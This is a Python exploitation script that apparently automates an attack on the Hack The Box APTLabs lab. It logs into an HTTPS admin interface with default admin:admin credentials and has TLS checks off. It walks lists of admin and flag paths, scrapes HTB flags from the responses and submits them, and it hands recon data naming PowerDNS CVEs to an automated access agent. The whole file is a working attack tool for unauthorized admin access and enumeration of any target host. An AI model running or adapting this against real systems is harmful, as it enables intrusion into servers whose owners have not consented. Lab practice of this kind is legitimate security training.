#!/usr/bin/env python3
"""
Exploitation phase against APTLabs target host
Focus on exploiting the weak authentication vulnerability discovered
"""

import asyncio
import sys
import os
import subprocess
import requests
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

sys.path.append(os.path.join(os.path.dirname(__file__), 'agents'))

from agents.initial_access_agent import InitialAccessAgent

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

TARGET_HOST = sys.argv[1] if len(sys.argv) > 1 else None

if not TARGET_HOST:
    print("Usage: python run_exploitation.py <target_host>")
    print("Example: python run_exploitation.py 10.10.110.13")
    sys.exit(1)
ADMIN_CREDENTIALS = ("admin", "admin")

async def exploit_weak_authentication():
    """Exploit the weak authentication vulnerability on the admin interface."""
    print(f"🎯 Exploiting weak authentication on {TARGET_HOST}/admin")
    
    base_url = f"https://{TARGET_HOST}"
    session = requests.Session()
    session.verify = False
    
    try:
        print(f"🔑 Attempting to access admin interface with {ADMIN_CREDENTIALS[0]}:{ADMIN_CREDENTIALS[1]}")
        
        response = session.get(
            f"{base_url}/admin",
            auth=ADMIN_CREDENTIALS,
            timeout=15
        )
        
        print(f"Response status: {response.status_code}")
        print(f"Response headers: {dict(response.headers)}")
        
        if response.status_code == 200:
            print(f"✅ Successfully accessed admin interface!")
            
            content = response.text
            print(f"Admin interface content length: {len(content)}")
            
            flag_pattern = r'HTB\{[^}]+\}'
            flags = re.findall(flag_pattern, content)
            
            if flags:
                print(f"🚩 Found {len(flags)} flags in admin interface!")
                for flag in flags:
                    print(f"  Flag: {flag}")
                    await submit_flag(flag)
                return flags
            else:
                print("No flags found in admin interface content")
                print(f"Content preview:\n{content[:1000]}...")
                
                await explore_admin_interface(session, base_url)
        
        elif response.status_code == 401:
            print(f"❌ Authentication failed - credentials may be incorrect")
        else:
            print(f"⚠️  Unexpected response: {response.status_code}")
            print(f"Response content: {response.text[:500]}...")
            
    except requests.exceptions.SSLError as e:
        print(f"❌ SSL Error: {e}")
        print("Trying with different SSL settings...")
        
        try:
            import ssl
            session.mount('https://', requests.adapters.HTTPAdapter())
            response = session.get(
                f"{base_url}/admin",
                auth=ADMIN_CREDENTIALS,
                timeout=15,
                verify=False
            )
            print(f"Retry response status: {response.status_code}")
        except Exception as retry_e:
            print(f"❌ Retry also failed: {retry_e}")
            
    except Exception as e:
        print(f"❌ Exploitation failed: {e}")
        
    return []

async def explore_admin_interface(session, base_url):
    """Explore the admin interface for additional endpoints and flags."""
    print(f"\n🔍 Exploring admin interface endpoints")
    
    admin_paths = [
        "/admin/config",
        "/admin/status",
        "/admin/logs",
        "/admin/users",
        "/admin/settings",
        "/admin/backup",
        "/admin/flag",
        "/admin/flag.txt",
        "/admin/system",
        "/admin/dashboard"
    ]
    
    for path in admin_paths:
        try:
            response = session.get(
                f"{base_url}{path}",
                auth=ADMIN_CREDENTIALS,
                timeout=10
            )
            
            if response.status_code == 200:
                print(f"✅ Found admin endpoint: {path}")
                
                flag_pattern = r'HTB\{[^}]+\}'
                flags = re.findall(flag_pattern, response.text)
                
                if flags:
                    print(f"🚩 Found flags in {path}!")
                    for flag in flags:
                        print(f"  Flag: {flag}")
                        await submit_flag(flag)
                else:
                    print(f"  Content length: {len(response.text)}")
                    if len(response.text) > 100:
                        print(f"  Preview: {response.text[:200]}...")
                        
        except Exception as e:
            continue

async def use_initial_access_agent():
    """Use the InitialAccessAgent to attempt exploitation."""
    print(f"\n🤖 Using InitialAccessAgent for exploitation")
    
    try:
        agent = InitialAccessAgent()
        
        recon_data = {
            "target": TARGET_HOST,
            "services": [
                {
                    "port": 53,
                    "service": "PowerDNS",
                    "version": "4.1.11",
                    "vulnerabilities": ["CVE-2019-10203", "CVE-2019-10162"]
                },
                {
                    "port": 443,
                    "service": "Radicale/PowerGSLB",
                    "version": "1.7.3",
                    "vulnerabilities": ["Weak Authentication"],
                    "credentials": "admin:admin"
                }
            ]
        }
        
        result = await agent.attempt_initial_access(TARGET_HOST, recon_data)
        
        print(f"Agent exploitation result: {result}")
        
        if result and result.get('overall_status') == 'success':
            print(f"✅ InitialAccessAgent successful!")
            
            if 'flags' in result:
                for flag in result['flags']:
                    await submit_flag(flag)
                    
        return result
        
    except Exception as e:
        print(f"❌ InitialAccessAgent failed: {e}")
        import traceback
        traceback.print_exc()
        return None

async def manual_flag_search():
    """Manual search for flags in common locations."""
    print(f"\n🔍 Manual flag search on {TARGET_HOST}")
    
    base_url = f"https://{TARGET_HOST}"
    session = requests.Session()
    session.verify = False
    
    flag_paths = [
        "/flag.txt",
        "/user.txt", 
        "/root.txt",
        "/home/user/user.txt",
        "/root/root.txt",
        "/var/www/html/flag.txt",
        "/tmp/flag.txt",
        "/flag",
        "/admin/flag.txt",
        "/.flag",
        "/backup/flag.txt"
    ]
    
    flags_found = []
    
    for path in flag_paths:
        try:
            response = session.get(f"{base_url}{path}", timeout=5)
            
            if response.status_code == 401:
                response = session.get(
                    f"{base_url}{path}",
                    auth=ADMIN_CREDENTIALS,
                    timeout=5
                )
            
            if response.status_code == 200:
                print(f"✅ Accessible path: {path}")
                
                flag_pattern = r'HTB\{[^}]+\}'
                flags = re.findall(flag_pattern, response.text)
                
                if flags:
                    for flag in flags:
                        print(f"🚩 FLAG FOUND: {flag} at {path}")
                        flags_found.append(flag)
                        await submit_flag(flag)
                else:
                    content = response.text.strip()
                    if len(content) > 10 and len(content) < 100:
                        print(f"  Content: {content}")
                        
        except Exception as e:
            continue
    
    return flags_found

async def submit_flag(flag):
    """Submit discovered flag to HTB."""
    print(f"\n🚩 Submitting flag: {flag}")
    
    try:
        result = subprocess.run([
            "htb-operator", "prolabs", "submit",
            "--name", "APTLabs", 
            "--flag", flag
        ], capture_output=True, text=True, timeout=30)
        
        if result.returncode == 0:
            print(f"✅ Flag submitted successfully!")
            print(f"Response: {result.stdout.strip()}")
            return True
        else:
            print(f"❌ Flag submission failed: {result.stderr.strip()}")
            return False
            
    except Exception as e:
        print(f"❌ Flag submission error: {e}")
        return False

async def main():
    """Run comprehensive exploitation against the target."""
    print(f"🎯 APTLabs Exploitation Phase")
    print(f"Target: {TARGET_HOST}")
    print(f"Known vulnerabilities: Weak Authentication (admin:admin)")
    print("=" * 60)
    
    all_flags = []
    
    auth_flags = await exploit_weak_authentication()
    all_flags.extend(auth_flags)
    
    agent_result = await use_initial_access_agent()
    
    manual_flags = await manual_flag_search()
    all_flags.extend(manual_flags)
    
    print(f"\n{'='*60}")
    print("🏁 EXPLOITATION SUMMARY")
    print(f"{'='*60}")
    print(f"Target: {TARGET_HOST}")
    print(f"Total flags captured: {len(all_flags)}")
    
    if all_flags:
        print(f"\n🎉 SUCCESS - Captured {len(all_flags)} flags!")
        for i, flag in enumerate(all_flags, 1):
            print(f"  {i}. {flag}")
        return True
    else:
        print(f"\n⚠️  No flags captured during exploitation")
        return False

if __name__ == "__main__":
    asyncio.run(main())
